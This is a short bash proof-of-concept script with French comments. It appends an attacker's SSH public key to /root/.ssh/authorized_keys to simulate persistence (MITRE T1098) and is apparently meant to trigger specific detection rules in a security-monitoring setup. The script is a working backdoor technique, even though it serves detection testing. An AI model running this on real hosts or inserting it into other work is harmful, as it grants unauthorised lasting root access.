#!/bin/bash
# =====================================================================
# PoC 2 — Persistance via injection de clé SSH
# MITRE ATT&CK : T1098 (Account Manipulation)
# Détection attendue : Règles 100005 + 100006 (Niveau 10)
# =====================================================================

echo "[*] Injection d'une clé SSH malveillante..."

mkdir -p /root/.ssh
chmod 700 /root/.ssh

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuZ...attaquant@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

echo "[+] Clé SSH injectée dans /root/.ssh/authorized_keys"